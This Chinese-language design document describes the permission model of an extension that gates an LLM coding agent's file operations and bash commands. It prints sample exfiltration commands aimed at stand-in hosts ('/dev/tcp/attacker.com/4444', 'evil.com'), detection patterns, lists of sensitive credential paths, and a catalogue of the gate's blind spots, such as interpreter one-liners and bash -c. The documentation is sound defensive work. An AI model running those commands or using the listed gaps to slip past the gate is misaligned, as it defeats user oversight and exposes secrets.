# Permission Model

> **以源码为准**。本文档描述当前实现的安全边界；若发现文档与实现不一致，以源码为准。
> 每条声明标注来源（spec 引用或源码行号）以便验证。

## Overview

`permission-guard-pi` 是一个 pi-coding-agent 的扩展，为 LLM 代理的文件操作和 bash 命令提供权限控制层。系统在工具调用和 bash 命令执行前插入一道"permission gate"，根据路径、操作类型、敏感匹配和用户配置做出三种决策：**auto_allow**（静默放行）、**prompt**（弹窗确认，分 tier=two 和 tier=three 两档）、**deny_hard**（硬拒绝）。

权限模型分三层：**配置层**（用户通过 JSONC 文件声明路径权限）、**决策层**（纯函数引擎根据路径+操作+区域+敏感匹配返回决策）、**集成层**（pi extension 将决策转化为弹窗/阻断行为）。

## Design Goals

1. **项目内操作静默**——`project_inner` 区域的读写操作默认 auto_allow，不打断用户工作流（`decision.ts:195-203`）
2. **敏感路径保护**——SSH 密钥、私钥、凭证存储、系统机密文件默认弹窗或硬拒绝（`sensitive.ts` 5 条规则）
3. **路径声明优先于敏感兜底**——用户显式配置的权限级别覆盖默认敏感规则（`decision.ts:65-133`，`access-decision` spec "权限声明优先于默认敏感兜底"）
4. **三档弹窗分级**——tier=three 允许"总是允许"持久化授权，tier=two 仅"允许一次/会话内允许"（不持久化敏感路径）（`decision.ts:169-177`）
5. **配置分层与优先级**——local > project > global 三档合并，后声明者胜（`config.ts:154-158`，`permission-config` spec "优先级解析"）
6. **授权记忆双通道**——会话级（进程内、重启失效）+ 持久化（trusted.json、跨会话），键含项目标识保证项目隔离（`grant-memory` spec "双通道记忆"）
7. **审计日志全记录**——所有权限决策进入 JSONL 日志，串行写入保证不产生损坏行（`audit.ts:110-150`）

## Non-Goals

以下是系统**明确不做**的事。每条可通过 grep 源码确认无对应实现，或对照 spec 确认无对应 requirement。

1. **不做完整 shell 解析**
   - bash 命令通过正则和启发式提取文件目标（`bash-extract.ts`），不实现完整 shell grammar 解析器。`$(...)`、反引号、子 shell、heredoc 等复杂语法直接标记为"不可靠"（`bash-extract.ts:9-24`），不做语义展开。
   - 验证：`grep -n "command_substitution\|heredoc\|control_flow" src/lib/bash-extract.ts` 返回"不可靠"标记定义。

2. **不做解释器代码静态分析**
   - 对 `python -c "open('/etc/passwd').read()"`、`node -e "fs.readFile(...)"` 等解释器内联代码，系统无法穿透解释器语义提取文件目标——bash extractor 仅扫描 bash 层面的路径 token，不分析解释器内部的代码语义。
   - 验证：`grep -n "python\|node.*-e\|interpreter" src/lib/bash-extract.ts` 无对应解析逻辑。

3. **不做运行时路径推断**
   - 未展开的 shell 变量（`$MYSECRETS`、`${HOME}/x`）标记为"不可靠"（`unresolved variable`），不做运行时环境变量解析。仅 `$HOME` 和 `$PWD` 做有限展开（`bash-extract.ts:42`）。
   - 验证：`grep -n "unresolved variable\|unresolved" src/lib/bash-extract.ts` 返回不可靠标记。

4. **不做沙箱或 OS 级安全边界**
   - 系统是 permission gate（决策层），不是沙箱——不限制进程的文件系统访问能力。用户仍可通过其他途径（非 pi 工具、非受控 shell）访问任何路径。系统提供的是"弹窗确认"而非"访问阻止"。
   - 验证：无 `sandbox`、`seccomp`、`chroot`、`namespace` 等关键词。

5. **不做跨会话热更新**
   - 配置文件在会话初始化时加载一次（`config.ts:122-134`），会话内编辑配置文件不立即生效。下次会话开始时新配置才生效。
   - 验证：`config.ts` 中 `loadConfigFile` 仅在 `initSession` 时调用，无 `fs.watch` 或轮询逻辑。

6. **不做解释器代码的网络行为检测**
   - 对 `curl http://evil.com/data`、`wget http://...` 等网络命令，系统不分析其网络行为（DNS 解析、HTTP 请求目标等）。网络检测仅限 bash dev-socket 写入（`/dev/tcp/*`、`/dev/udp/*`）和数字 fd 别名（`/dev/fd/[0-9]+`）（`decision.ts:139-158`）。
   - 验证：`grep -n "curl\|wget\|http\|network" src/lib/bash-extract.ts` 无对应逻辑。

7. **不做多用户权限隔离**
   - 系统假设单一用户（pi-coding-agent 运行用户）。配置和授权记忆按项目隔离（`projectHash`），但不做多用户权限隔离。同一项目下的不同用户共享相同的权限决策。
   - 验证：无 `user`、`group`、`permission` 等多用户隔离逻辑。

## Known Limitations

以下是当前实现**已知的安全盲区与 heuristics 边界**。每条含"是什么"（一句话）、"为什么存在"（设计权衡）、"如何验证"（反例命令或 grep 检查）。

1. **fail-open 未知命令**
   - **是什么**：不在 READ_ONLY_COMMANDS 或 SILENT_COMMANDS 列表中的命令，如果其路径参数不在已知 read/write 命令的提取范围内，会被视为"无目标"并静默放行。
   - **为什么存在**：bash extractor 是白名单模型——只提取已知命令的路径目标。未知命令的语义无法静态确定，保守策略是标记为"不可靠"（走弹窗），但"无目标"命令（如 `git status`）被静默放行。
   - **如何验证**：运行 `git status`（静默）vs `some_unknown_cmd /etc/passwd`（弹窗，reason=unresolved variable 或 fallback）。`grep -n "READ_ONLY_COMMANDS\|SILENT_COMMANDS" src/lib/bash-extract.ts`。

2. **forwarder 非首阶段下游盲区**
   - **是什么**：`| xargs rm`、`| parallel echo` 等 forwarder 的非首阶段下游命令，系统仅检查 forwarder 本身是否为写操作，不深入分析 downstream 命令的具体行为。
   - **为什么存在**：forwarder 的 downstream 是运行时展开的——`xargs` 接收上游管道输出作为参数，无法静态确定。系统检查 forwarder 的第一阶段是否为写操作（`isForwarderStageSafe`），但 downstream 的语义分析超出静态分析能力。
   - **如何验证**：`find . | xargs rm`（弹窗，reason=forwarding_command）vs `cat file.txt | xargs wc -l`（弹窗，reason=forwarding_command）。`grep -n "forwarding_command\|isForwarderStageSafe" src/lib/bash-extract.ts`。

3. **bash grant 扫裸路径 token 的局限性**
   - **是什么**：`bash -c "cat /etc/passwd"` 中，`/etc/passwd` 在 bash -c 的字符串参数内，不在 bash 命令的顶层 token 中。系统无法穿透 shell forwarder 的字符串参数提取路径。
   - **为什么存在**：bash forwarder（`bash -c`、`sh -c`）的字符串参数是运行时展开的——其中的路径、变量、命令替换都不可静态分析。系统标记整个 forwarder 为"不可靠"（reason=shell_forwarder），走弹窗，但不提取内部路径。
   - **如何验证**：`bash -c "cat /etc/passwd"`（弹窗，reason=shell_forwarder，targets=[]）vs `cat /etc/passwd`（弹窗，targets=[read /etc/passwd]）。`grep -n "shell_forwarder" src/lib/bash-extract.ts`。

4. **heredoc 内容不可分析**
   - **是什么**：未引号定界的 heredoc（`<<EOF`）内容被视为不可靠——内容中的路径、变量、命令替换都不可静态确定。引号定界 heredoc（`<<'EOF'`）被视为字面数据，内容不可靠但命令本身可提取。
   - **为什么存在**：未引号定界 heredoc 内容会展开 `$`、反引号、`$(...)`——这些展开后的值不可静态确定。引号定界 heredoc 内容是字面量，不做展开。
   - **如何验证**：`cat <<EOF\n/etc/passwd\nEOF`（弹窗，reason=heredoc）vs `cat <<'EOF'\n/etc/passwd\nEOF`（弹窗，reason=heredoc，但 heredoc 前命令可提取）。`grep -n "heredoc" src/lib/bash-extract.ts`。

5. **变量展开仅支持 $HOME 和 $PWD**
   - **是什么**：仅 `$HOME`、`${HOME}`、`$PWD`、`${PWD}` 做有限展开。其他变量（`$MYSECRETS`、`${PATH}`）标记为"不可靠"（reason=unresolved variable）。
   - **为什么存在**：运行时环境变量不可静态确定——`$MYSECRETS` 可能指向任何路径。仅 `$HOME` 和 `$PWD` 有确定的环境变量值（OS 提供）。
   - **如何验证**：`cat /etc/passwd`（正常提取）vs `cat $MYSECRETS`（弹窗，reason=unresolved variable）。`grep -n "HOME\|PWD\|unresolved" src/lib/bash-extract.ts`。

6. **敏感路径表是白名单模型**
   - **是什么**：敏感路径表（`sensitive.ts`）是白名单——仅列出的模式（SSH key、私钥、凭证存储、系统机密）被视为敏感。未在列表中的敏感文件（如 `/etc/passwd`、`/etc/hosts`、自定义凭证文件）不被视为敏感。
   - **为什么存在**：敏感路径表需要平衡安全性与用户体验——列太多会产生噪音弹窗，列太少会遗漏真正的敏感文件。当前选择是"高置信度敏感文件"（SSH key、私钥、凭证）+ "高权限提升入口"（/etc/shadow、/etc/sudoers、cron 配置）。
   - **如何验证**：`cat ~/.ssh/id_rsa`（弹窗，sensitive）vs `cat /etc/passwd`（auto_allow，非敏感）。`grep -n "DEFAULT_SENSITIVE_RULES" src/lib/sensitive.ts`。

7. **软 prompt guardrails 非硬约束**
   - **是什么**：`BASH_GUARDRAILS` 数组通过 `before_agent_start` 事件注入到 LLM 的 system prompt 中，引导 LLM 选择静默路径。但这不是硬约束——LLM 仍可能生成弹窗命令，系统会正常处理弹窗。
   - **为什么存在**：guardrails 是 prompt 层面的引导，不是代码层面的强制。系统的硬约束在 permission gate 中（弹窗/阻断），guardrails 只是"减少弹窗"的优化。
   - **如何验证**：`grep -n "BASH_GUARDRAILS\|promptGuidelines" extensions/index.ts`。

8. **find 命令的写操作检测依赖 flag 白名单**
   - **是什么**：`find` 命令的读/写判定依赖 flag 检测——`-delete`、`-exec`、`-execdir`、`-ok`、`-okdir` 被视为写操作，其他 flag 被视为读操作。但 `find` 的 `-exec` 可以执行任意命令（包括读命令），系统仅检查 flag 本身而非 `-exec` 后的命令。
   - **为什么存在**：`find -exec` 后的命令是运行时展开的——无法静态确定。系统采用保守策略：只要 `-exec` flag 存在，就视为写操作。
   - **如何验证**：`find . -name '*.ts'`（静默，read-only）vs `find . -delete`（弹窗，reason=find_write_flag）vs `find . -exec cat {} \;`（弹窗，reason=find_write_flag）。`grep -n "FIND_WRITE_FLAGS\|find_write_flag" src/lib/bash-extract.ts`。

9. **网络行为检测仅限 dev-socket**
   - **是什么**：网络行为检测仅覆盖 bash dev-socket 写入（`/dev/tcp/*`、`/dev/udp/*`）和数字 fd 别名（`/dev/fd/[0-9]+`）。`curl`、`wget`、`scp` 等网络命令的语义不被分析——系统不检查其网络目标或 HTTP 方法。
   - **为什么存在**：dev-socket 是 bash 内建的套接字路径，可被用于网络外带数据（`echo payload > /dev/tcp/attacker.com/4444`）。`curl`/`wget` 等命令的语义是"下载文件"，不是"外带数据"——系统将其视为普通命令（可能在 SILENT_COMMANDS 中）。
   - **如何验证**：`echo payload > /dev/tcp/attacker.com/4444`（弹窗，reason=network exfiltration path）vs `curl http://example.com/file`（可能在 SILENT_COMMANDS 中，静默）。`grep -n "isDevSocketOrFd\|dev/tcp\|dev/udp" src/lib/bash-extract.ts src/lib/decision.ts`。

10. **审计日志截断长命令**
    - **是什么**：审计日志中的 `command` 字段超过 512 字符时被截断为 511 字符 + U+2026（…），并添加 `note: "command truncated"`。截断后的日志可能丢失命令的关键信息。
    - **为什么存在**：审计日志是 JSONL 追加写入，单行过长会影响可读性和性能。512 字符是合理截断点——超过此长度的命令通常是 heredoc、脚本或复杂管道，截断后仍保留前 511 字符的上下文。
    - **如何验证**：`grep -n "MAX_COMMAND_CHARS\|TRUNCATION_MARKER\|truncateCommand" src/lib/audit.ts`。

## Explicit Boundary

以下是系统行为的**显式边界契约**——什么受保护、什么不受保护、边界在何处。按分系统分组，每个分系统含"受保护什么"（bullet list）、"不受保护什么"（bullet list）、"边界在何处"（一句话）。

### bash-target-extraction

**受保护什么**：
- 已知 read/write 命令的路径参数提取（`cat`、`head`、`tail`、`wc`、`grep`、`ls`、`tree`、`stat`、`du`、`df`、`file`、`less`、`more`、`rm`、`mv`、`cp`、`tee`、`install`、`ln -s`、`chmod`、`chown`、`truncate`、`dd of=`、`curl -o/--output`、`wget -O`）
- 重定向操作符（`>`、`>>`、`2>`、`2>>`）的写入目标提取
- 引号感知的语法扫描（单引号内字面量、双引号内 `$()` 仍执行、反斜杠转义）
- 管道按 stage 独立提取（每个 stage 独立判可靠）
- 转发器（`xargs`、`parallel`、`pforeach`）的写入检测
- `find` 命令的写操作 flag 检测（`-delete`、`-exec`、`-execdir`、`-ok`、`-okdir`）
- 字面量 for 循环的只读体豁免（迭代集全字面量 + 体全 read-only 命令）
- 引号定界 heredoc 的内容跳过（`<<'EOF'`、`<<"EOF"`、`<<-'EOF'`）
- `$HOME`、`${HOME}`、`$PWD`、`${PWD}` 的有限展开
- 网络外带路径检测（`/dev/tcp/*`、`/dev/udp/*`、`/dev/fd/[0-9]+`）
- 良性 `/dev/*` 目标豁免（`/dev/null`、`/dev/stderr`、`/dev/stdout`、`/dev/zero`、`/dev/fd/stdin` 等）

**不受保护什么**：
- 解释器代码内的文件访问（`python -c`、`node -e` 等）
- 未展开的 shell 变量（`$MYSECRETS`、`${PATH}` 等）
- 命令替换、子 shell、process substitution 内的命令
- 未引号定界 heredoc 的内容
- 转发器 downstream 命令的具体行为
- 未知命令的路径参数

**边界在何处**：bash 命令通过静态分析提取文件目标，复杂语法标记为"不可靠"（走弹窗），不尝试穿透运行时展开的边界。可靠/不可靠的判定是二元的——要么所有目标提取完整，要么整个命令走弹窗。

### sensitive-path-classification

**受保护什么**：
- SSH 密钥文件（`id_rsa`、`id_dsa`、`id_ecdsa`、`id_ed25519`、`known_hosts`、`authorized_keys`、`config` in `.ssh`）
- 私钥/证书文件（`.pem`、`.key`、`.pfx`、`.p12`、`.jks`、`.kdbx`、`.asc`、`.gpg`）
- 环境文件与凭证存储（`.env`、`.envrc`、`.env.*` 除 `.env.example`、`~/.ssh`、`~/.gnupg`、`~/.aws`、`~/.kube`、`~/.docker`、`~/.netrc`、`~/.git-credentials`）
- 凭证配置文件（`credentials`、`secrets.yaml`、`secrets.yml`、`secrets.json`、`.npmrc`、`.netrc`）
- 系统机密文件（`/etc/shadow`、`/etc/sudoers`、`/etc/master.passwd`、`/etc/crontab`、`/etc/cron.d/*`、`/etc/cron.{hourly,daily,weekly,monthly}/*`、`/etc/hosts.allow`、`/etc/hosts.deny`）

**不受保护什么**：
- 公开系统配置文件（`/etc/passwd`、`/etc/hosts`、`/etc/hostname`、`/etc/group`、`/etc/nsswitch.conf`）
- 未在列表中的敏感文件（自定义凭证文件、非标准密钥格式）
- 目录本身的敏感判定（仅文件级匹配，不检查目录权限）

**边界在何处**：敏感路径表是白名单模型——仅列出的模式被视为敏感，其他路径按"未配置"处理。敏感判定在决策引擎的 step 2b（无配置声明时触发），用户显式配置（step 1）优先于敏感兜底。

### access-decision

**受保护什么**：
- 配置声明的路径权限（`read_write`、`read_only`、`unread`）
- 跨源冲突标记（unread-involved conflicts 强制弹窗）
- 网络外带路径写入（`/dev/tcp/*`、`/dev/udp/*`、`/dev/fd/[0-9]+` → tier=two，无"总是允许"）
- 敏感路径兜底（inner → tier=three，outer → tier=two）
- `/tmp/**` 默认写入豁免（临时目录自动放行）

**不受保护什么**：
- 非敏感路径的未配置读取（outer 区域 auto_allow）
- 配置声明的权限覆盖敏感兜底（用户显式声明优先）
- 跨源冲突中不含 unread 的组合（静默应用优先级，不弹窗）

**边界在何处**：决策引擎是纯函数——给定（policy, absPath, projectRoot, action, isInside, sensitive），返回 auto_allow / prompt / deny_hard。决策引擎不检查授权记忆（那是集成层的职责），不做动态 dispatch。

### approval-flow

**受保护什么**：
- tier=three 弹窗（提供"允许一次/会话内允许/总是允许"三选项）
- tier=two 弹窗（仅提供"允许一次/会话内允许"两选项，不提供"总是允许"）
- 跨源冲突弹窗（reason 包含冲突说明）
- 敏感路径弹窗（reason 包含敏感原因）

**不受保护什么**：
- 弹窗的 UI 呈现方式（由 pi-coding-agent 的 UI 层决定）
- 弹窗的超时行为（由 pi-coding-agent 的 UI 层决定）
- 弹窗的取消行为（取消等价于 deny，但无持久化记录）

**边界在何处**：approval-flow 负责弹窗的呈现与交互，不负责决策逻辑。决策结果（auto_allow / prompt / deny_hard）由决策引擎产生，approval-flow 仅负责将 prompt 转化为 UI 交互。

### grant-memory

**受保护什么**：
- 项目隔离（键含 projectHash，不同项目授权不互相影响）
- 敏感文件按文件记忆（非按目录，`~/.ssh/id_rsa` 的授权不影响 `~/.ssh/known_hosts`）
- 未配置路径不写入持久化（tier=two 无"总是允许"选项）
- 会话级记忆在 session_start 清空
- trusted.json 文件权限（0o600，目录 0o700）
- Bash 命令记忆的权限类型映射（glob_expansion/unresolved variable → read_only，control_flow/shell_forwarder/forwarding_command/cd_chdir → read_write）

**不受保护什么**：
- 跨项目授权隔离（不同 worktree 的授权隔离）
- 授权记忆的吊销（无 UI 提供吊销入口）
- 授权记忆的过期（无 TTL 机制）
- Windows 文件权限（fs.chmod 是 no-op）

**边界在何处**：授权记忆是决策后的状态存储——决策引擎不检查记忆，集成层在调用决策引擎之前检查记忆。记忆命中即直接放行，跳过决策引擎。

### permission-config

**受保护什么**：
- 三档配置位置（全局 `~/.pi/agent/permission.json`、项目 `<proj>/.pi/permission.json`、项目本地 `<proj>/.pi/local/permission.json`）
- JSONC 语法（注释、尾逗号）
- 路径模式分类（绝对 vs 相对、字面 vs glob）
- 优先级解析（local > project > global，字面 > glob）
- 跨源冲突标记（传递给决策引擎）
- 配置文件加载时机（会话初始化时加载一次，不支持热更新）

**不受保护什么**：
- 配置文件的 schema 验证（仅检查权限值是否合法，不验证路径格式）
- 配置文件的加密（明文 JSONC，不加密）
- 配置文件的版本控制（不管理配置版本）
- 配置文件的远程同步（仅本地文件）

**边界在何处**：配置层负责加载、合并、解析配置，不负责决策逻辑。配置是静态的（会话内不更新），决策引擎在运行时根据配置做出决策。

## User Experience Model

从用户视角，安全模型应被理解为：

- **项目内操作几乎无感**——读写项目内文件不打断工作流，只在敏感文件或配置声明限制时才弹窗
- **敏感文件永远弹窗**——SSH 密钥、私钥、凭证文件等敏感路径即使配置了 read_write 也会按权限级别决策，未配置时弹窗
- **外部路径写操作弹窗**——项目外的写入默认弹窗（tier=three），用户可以持久化授权
- **外部路径读操作静默**——项目外的非敏感文件读取默认 auto_allow（不打断工作流）
- **复杂 bash 命令弹窗**——含变量、管道、转发器、heredoc 等复杂语法的命令走弹窗，弹窗显示完整命令原文
- **dev-socket 写入永远弹窗**——网络外带路径（`/dev/tcp`、`/dev/udp`、`/dev/fd/[0-9]+`）的写入强制 tier=two，不提供"总是允许"
- **弹窗分级清晰**——tier=three 提供三选项（可持久化），tier=two 提供两选项（不可持久化），用户能区分"可以一劳永逸"和"每次都要确认"
- **审计日志全记录**——所有权限决策进入 JSONL 日志，用户可随时复核历史决策

## Summary

`permission-guard-pi` 通过三层权限模型（配置层 → 决策层 → 集成层）为 pi-coding-agent 提供文件操作和 bash 命令的权限控制。系统保护的是"敏感文件"和"外部写入"，不保护的是"项目内操作"和"外部读取"。安全边界的核心是"敏感路径永远弹窗"和"dev-socket 写入永远弹窗"两个硬底线——这两条规则无法被用户配置绕过。

系统明确不做完整 shell 解析、不做解释器代码静态分析、不做沙箱隔离——这些是设计决策而非遗漏。系统提供的是"弹窗确认"而非"访问阻止"，用户仍可通过其他途径访问任何路径。理解这个边界是正确使用该系统的前提。

未来扩展方向（tool+pattern 规则升级、CredentialShell 层）应在不改变这两个硬底线的前提下推进。
